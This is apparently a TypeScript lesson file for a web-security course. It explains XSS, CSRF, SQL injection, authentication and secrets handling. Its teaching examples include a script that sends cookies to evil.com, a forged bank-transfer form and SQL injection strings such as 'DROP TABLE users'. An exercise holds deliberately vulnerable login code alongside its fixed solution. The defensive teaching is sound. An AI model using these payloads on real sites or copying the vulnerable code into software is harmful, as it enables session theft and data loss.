import type { Lesson } from '@/types';

export const securityLesson: Lesson = {
  id: 'security',
  slug: 'security',
  title: 'Security',
  description:
    'XSS, CSRF, SQL injection, authentication security, secrets management, environment variables, and production security practices every developer must know.',
  category: 'Production',
  order: 12,
  difficulty: 'intermediate',
  estimatedTime: 30,
  content: `Security is not a feature you add at the end. Every decision in your application — how you store data, how you handle input, how you manage authentication — has security implications.

This module covers the vulnerabilities that break real applications. Understanding these is not optional — security breaches destroy companies and expose users to real harm.

---

## XSS — Cross-Site Scripting

**What it is:** An attacker injects malicious JavaScript into your web page, which runs in other users' browsers.

**Example attack:**
\`\`\`
Attacker submits a comment:
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>

Your app stores this and renders it:
  <div class="comment">{comment.content}</div>  ← without escaping

Every user who views this comment sends their cookies to the attacker.
Attacker uses the cookie to impersonate the user.
\`\`\`

**Prevention:**

1. **Escape all output in HTML:**
\`\`\`tsx
// React escapes by default — dangerouslySetInnerHTML is the exception
<div>{comment.content}</div>  ✓ safe — React escapes this
<div dangerouslySetInnerHTML={{ __html: comment.content }} />  ✗ dangerous

// Only use dangerouslySetInnerHTML with sanitized content:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.content) }} />
\`\`\`

2. **Content Security Policy (CSP):**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
\`\`\`
CSP tells the browser which scripts to execute. Inline scripts without a valid nonce are blocked.

3. **Set HttpOnly cookies:** If auth tokens are in httpOnly cookies, JavaScript cannot steal them via XSS.

---

## CSRF — Cross-Site Request Forgery

**What it is:** An attacker tricks a logged-in user into making requests to your application from another site.

**Example attack:**
\`\`\`
User is logged into bank.com with a session cookie.
User visits evil.com which contains:

<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker-account" />
  <input name="amount" value="10000" />
</form>
<script>document.getElementById('f').submit();</script>

The browser sends the POST to bank.com with the user's session cookie.
Bank.com processes the transfer because the cookie is valid.
\`\`\`

**Prevention:**

1. **CSRF tokens:**
\`\`\`typescript
// Server: generate and store a token in the session
app.get('/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.json({ token });
});

// Server: verify on state-changing requests
function csrfProtection(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body._csrf;
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

// Client: include token in every POST/PUT/PATCH/DELETE
const csrfToken = await fetch('/csrf-token').then(r => r.json()).then(d => d.token);
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
});
\`\`\`

2. **SameSite cookies:**
\`\`\`
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
\`\`\`
\`SameSite=Strict\` cookies are not sent on cross-site requests — prevents CSRF without tokens.

3. **CORS:** Only allow requests from your own origin.
\`\`\`typescript
import cors from 'cors';
app.use(cors({
  origin: 'https://yourapp.com',  // not '*'
  credentials: true,
}));
\`\`\`

---

## SQL Injection

**What it is:** Attacker-controlled input is interpreted as SQL commands.

**Example attack:**
\`\`\`typescript
// VULNERABLE:
const email = req.body.email; // attacker sends: "' OR 1=1 --"
const query = \`SELECT * FROM users WHERE email = '\${email}'\`;
// Becomes: SELECT * FROM users WHERE email = '' OR 1=1 --'
// Returns ALL users — authentication bypassed

// ALSO VULNERABLE:
const userId = req.params.id; // attacker sends: "1; DROP TABLE users; --"
const query = \`SELECT * FROM users WHERE id = \${userId}\`;
\`\`\`

**Prevention:** Always use parameterized queries.

\`\`\`typescript
// SAFE — parameterized query
const { rows } = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]  // value is treated as data, never as SQL
);

// With Prisma — always safe by design
const user = await prisma.user.findUnique({ where: { email } });

// With raw SQL in Drizzle — still parameterized
const user = await db.select().from(users).where(eq(users.email, email));
\`\`\`

**Rule:** Never concatenate user input into SQL strings. Always use parameterized queries or an ORM.

---

## Authentication Security

\`\`\`typescript
// 1. Use bcrypt with sufficient rounds
const hash = await bcrypt.hash(password, 12);
// 12 rounds = ~300ms per hash — strong protection against brute force

// 2. Rate limit login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // 10 attempts
});

// 3. Lockout after repeated failures (more aggressive)
async function checkAccountLockout(userId: string) {
  const recentFailures = await redis.incr(\`login_failures:\${userId}\`);
  await redis.expire(\`login_failures:\${userId}\`, 15 * 60); // 15 min expiry

  if (recentFailures > 5) {
    throw new ForbiddenError('Account temporarily locked. Try again in 15 minutes.');
  }
}

// 4. JWT secrets must be strong
// BAD: JWT_SECRET=mysecret
// GOOD: JWT_SECRET=$(openssl rand -hex 64)
// Production: use a secret manager (AWS Secrets Manager, not .env)

// 5. Short-lived access tokens + refresh tokens
const accessToken = jwt.sign({ userId }, JWT_SECRET, { expiresIn: '15m' });
const refreshToken = jwt.sign({ userId }, JWT_REFRESH_SECRET, { expiresIn: '30d' });

// 6. Invalidate tokens on password change
async function changePassword(userId: string, newPassword: string) {
  const hash = await bcrypt.hash(newPassword, 12);
  await usersRepository.updatePassword(userId, hash);
  // Invalidate all refresh tokens for this user
  await refreshTokenRepository.deleteAllForUser(userId);
}
\`\`\`

---

## Secrets and Environment Variables

**Never commit secrets to git.** This is the most common security mistake.

\`\`\`bash
# .gitignore — these must ALWAYS be in .gitignore
.env
.env.local
.env.production
*.pem
*.key
secrets.json
credentials.json
\`\`\`

**Using environment variables:**
\`\`\`typescript
// .env (local development — NEVER commit this file)
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
JWT_SECRET=local-dev-secret-not-real
STRIPE_SECRET_KEY=sk_test_...

// Validate all required env vars at startup
import { z } from 'zod';

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
  NODE_ENV: z.enum(['development', 'production', 'test']),
});

export const env = envSchema.parse(process.env);
// This throws at startup if any required variable is missing
\`\`\`

**In production — secret managers:**
- AWS Secrets Manager
- HashiCorp Vault
- Doppler
- Railway / Vercel environment variable UI (for secrets that don't change often)

Do not store production secrets in .env files on servers. Use secret managers that:
- Rotate secrets automatically
- Audit who accessed which secret and when
- Never store secrets in git history

---

## Production Security Headers

\`\`\`typescript
import helmet from 'helmet';

// helmet sets secure HTTP headers automatically
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],  // Tailwind needs this
      imgSrc: ["'self'", "data:", "https://cdn.yourapp.com"],
      connectSrc: ["'self'", "https://api.yourapp.com"],
    },
  },
  // Also sets:
  // X-Frame-Options: DENY (prevents clickjacking)
  // X-Content-Type-Options: nosniff (prevents MIME sniffing)
  // Strict-Transport-Security (forces HTTPS)
  // Referrer-Policy: no-referrer (prevents referrer leakage)
}));
\`\`\`

---

## Input Validation at Every Boundary

\`\`\`typescript
// NEVER trust input — validate everything that comes from outside your system
// - HTTP request body
// - HTTP request query params
// - HTTP headers
// - URL parameters
// - File uploads (type, size)
// - External API responses

import { z } from 'zod';

// Validate request body
const createUserSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(8).max(128),
  name: z.string().min(1).max(100).trim(),
  // Do NOT allow role, admin, or other sensitive fields here
});

// Validate query params
const searchSchema = z.object({
  q: z.string().min(1).max(200),
  page: z.coerce.number().int().min(1).max(1000),
  limit: z.coerce.number().int().min(1).max(100),
});

// Validate URL params
const idSchema = z.object({
  id: z.string().uuid('Invalid ID format'),
});
\`\`\`

---

## OWASP Top 10 Summary

The OWASP Top 10 are the most critical web application security risks:

| Risk | Prevention |
|------|-----------|
| Injection (SQL, NoSQL, Command) | Parameterized queries, input validation |
| Broken Authentication | bcrypt, rate limiting, strong JWT secrets |
| Sensitive Data Exposure | Encrypt at rest, HTTPS, no secrets in logs |
| XML External Entities | Disable XXE in XML parsers |
| Broken Access Control | Check authorization on every request |
| Security Misconfiguration | Helmet, disable debug in production, update dependencies |
| XSS | Escape output, CSP headers, HttpOnly cookies |
| Insecure Deserialization | Validate all deserialized data |
| Known Vulnerabilities | Run npm audit, update dependencies |
| Insufficient Logging | Log all auth events, monitor for anomalies |

---

## Security Checklist for Every Project

\`\`\`
Authentication:
[ ] Passwords hashed with bcrypt (rounds >= 12)
[ ] Rate limiting on login and signup
[ ] JWT secrets are long and random
[ ] Access tokens short-lived (15 min)
[ ] No sensitive data in JWT payload

Input:
[ ] All request bodies validated with Zod
[ ] SQL uses parameterized queries only
[ ] File uploads validated by type and size
[ ] URL params validated before database use

Headers:
[ ] Helmet configured
[ ] CORS restricted to known origins
[ ] CSP configured
[ ] HTTPS enforced

Secrets:
[ ] .env in .gitignore
[ ] No secrets in code or git history
[ ] Environment variables validated at startup
[ ] Production secrets in secret manager

Dependencies:
[ ] npm audit run
[ ] Dependencies kept up to date
[ ] Dependabot or similar enabled
\`\`\``,
  codeExamples: [
    {
      title: 'Security Setup for a Production Express App',
      code: `// app.ts — secure Express setup
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import { env } from './lib/env'; // validated env vars

const app = express();

// Security headers (XSS protection, MIME sniffing, clickjacking, etc.)
app.use(helmet());

// CORS — only allow known origins
app.use(cors({
  origin: env.NODE_ENV === 'production'
    ? ['https://yourapp.com', 'https://www.yourapp.com']
    : 'http://localhost:3000',
  credentials: true,
}));

// Global rate limit (in addition to per-route limits)
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 500,                    // 500 requests per window per IP
  standardHeaders: true,
  legacyHeaders: false,
}));

// Body parsing with size limits
app.use(express.json({ limit: '10kb' }));  // prevent huge JSON bodies
app.use(express.urlencoded({ extended: true, limit: '10kb' }));

// Request ID for tracing
app.use((req, res, next) => {
  res.locals.requestId = crypto.randomUUID();
  res.setHeader('X-Request-Id', res.locals.requestId);
  next();
});

// Routes
app.use('/api/v1', apiRouter);

// Never expose stack traces in production
app.use((err, req, res, next) => {
  const isProduction = env.NODE_ENV === 'production';

  console.error({
    requestId: res.locals.requestId,
    error: err.message,
    stack: isProduction ? undefined : err.stack,
  });

  res.status(err.statusCode || 500).json({
    error: {
      code: err.code || 'INTERNAL_ERROR',
      message: isProduction && !err.isOperational
        ? 'Internal server error'
        : err.message,
    },
    requestId: res.locals.requestId,
  });
});`,
      explanation:
        'Every production Express app needs these security layers. Helmet sets headers. CORS restricts origins. Rate limiting prevents abuse. Body size limits prevent DoS. Stack traces never reach production users.',
    },
  ],
  commonMistakes: [
    'Committing .env files to git — immediately rotate all compromised secrets',
    'String concatenation in SQL queries — use parameterized queries without exception',
    'Using dangerouslySetInnerHTML without sanitizing the content — opens XSS vulnerability',
    'Not setting SameSite on session cookies — CSRF vulnerability',
    'Weak JWT secrets ("mysecret") — use cryptographically random 256-bit secrets',
    'Not validating file upload types using magic bytes — attackers upload scripts as images',
    'Logging sensitive data (passwords, tokens, credit cards) — logs are often stored unsecured',
  ],
  interviewQuestions: [
    {
      question: 'What is SQL injection and how do you prevent it?',
      answer:
        'SQL injection is when user input is concatenated directly into a SQL query, allowing attackers to modify the query structure. The attack can bypass authentication, exfiltrate data, or drop tables. Prevent it by always using parameterized queries (never string concatenation) or an ORM that parameterizes internally. The input is passed as a separate argument — it is treated as a literal value, never as SQL syntax.',
      difficulty: 'beginner',
    },
    {
      question: 'What is XSS and how does React help prevent it?',
      answer:
        'XSS (Cross-Site Scripting) is when attacker-controlled HTML/JavaScript is rendered in a victim\'s browser, allowing cookie theft, session hijacking, or malicious actions. React prevents XSS by escaping all content rendered via JSX — { } interpolation converts HTML characters to safe entities. The only exception is dangerouslySetInnerHTML, which bypasses escaping and should only be used with pre-sanitized content (via DOMPurify).',
      difficulty: 'intermediate',
    },
    {
      question: 'What is CSRF and how do you prevent it?',
      answer:
        'CSRF (Cross-Site Request Forgery) tricks an authenticated user\'s browser into making requests to your application from another site. The browser automatically sends session cookies with every request, so the server cannot tell if the request was intentional. Prevention: SameSite=Strict cookies (browser does not send them on cross-site requests), CSRF tokens (unique token per session verified on state-changing requests), and CORS configured to reject unexpected origins.',
      difficulty: 'intermediate',
    },
  ],
  exercises: [
    {
      id: 'find-the-vulnerabilities',
      title: 'Find the Security Vulnerabilities',
      description:
        'The code below has at least 5 security vulnerabilities. Find them all and write the fixed version.',
      starterCode: `// Vulnerable Express route
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  const query = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;
  const user = await db.query(query);

  if (user.rows.length > 0) {
    const token = jwt.sign({ userId: user.rows[0].id, role: user.rows[0].role }, 'secret');
    res.json({ token, user: user.rows[0] });
  } else {
    res.json({ error: 'Wrong email' });
  }
});

// Vulnerable route that renders user content
app.get('/profile/:id', async (req, res) => {
  const user = await db.query(\`SELECT * FROM users WHERE id = \${req.params.id}\`);
  res.send(\`<h1>Welcome \${user.rows[0].name}</h1><p>\${user.rows[0].bio}</p>\`);
});`,
      solution: `// VULNERABILITIES FOUND:
// 1. SQL injection in login query (string concatenation)
// 2. Passwords stored/compared in plain text (should use bcrypt)
// 3. JWT signed with weak secret 'secret' and no expiry
// 4. User enumeration: "Wrong email" reveals if email exists
// 5. Full user object returned (includes passwordHash)
// 6. SQL injection in profile route (req.params.id in SQL)
// 7. XSS in profile HTML (user.name and user.bio not escaped)
// 8. No authentication on routes that should be protected

// FIXED VERSION:
app.post('/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;

  // 1. Parameterized query (SQL injection fix)
  const result = await db.query(
    'SELECT * FROM users WHERE email = $1',
    [email.toLowerCase()]
  );

  const user = result.rows[0];

  // 2. bcrypt comparison (plain text fix)
  // 4. Same error message for wrong email AND wrong password (enumeration fix)
  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return res.status(401).json({ error: { code: 'INVALID_CREDENTIALS', message: 'Invalid email or password' } });
  }

  // 3. Strong secret, expiry set
  const token = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET!, // strong random secret from env
    { expiresIn: '15m' }
  );

  // 5. Never return the password hash
  const { password_hash, ...safeUser } = user;

  res.json({ data: { token, user: safeUser } });
});

// FIXED profile route (note: this should be an API returning JSON, not HTML)
app.get('/api/users/:id', authenticate, async (req, res) => {
  // 6. Validate param is a valid UUID before using in query
  const { id } = idSchema.parse(req.params);

  const result = await db.query(
    'SELECT id, name, bio, avatar_url FROM users WHERE id = $1',
    [id] // 6. Parameterized
  );

  if (!result.rows[0]) return res.status(404).json({ error: 'Not found' });

  // 7. No XSS — JSON is not interpreted as HTML by the browser
  // 5. Only safe fields selected
  res.json({ data: result.rows[0] });
});`,
      hints: [
        'Count SQL queries that use string concatenation — each one is an injection point',
        'What happens after a successful login? What does the response contain?',
        'How does the server compare passwords? Is it comparing hashes?',
        'What does the error message reveal about whether the email exists?',
      ],
    },
  ],
  keyTakeaways: [
    'XSS: escape all HTML output; React does this by default; never use dangerouslySetInnerHTML without sanitizing',
    'SQL injection: always use parameterized queries; never concatenate user input into SQL strings',
    'CSRF: use SameSite=Strict cookies and validate the Origin header for state-changing requests',
    'Passwords: bcrypt with >= 12 rounds; rate limit login; same error message for wrong email AND wrong password',
    'Secrets: never commit .env files; use secret managers in production; validate all env vars at startup',
    'Helmet, CORS, rate limiting, body size limits — every production Express app needs all of these',
    'Input validation at every boundary: request body, query params, URL params, file uploads',
  ],
  nextLesson: 'deployment',
  prevLesson: 'api-design',
};
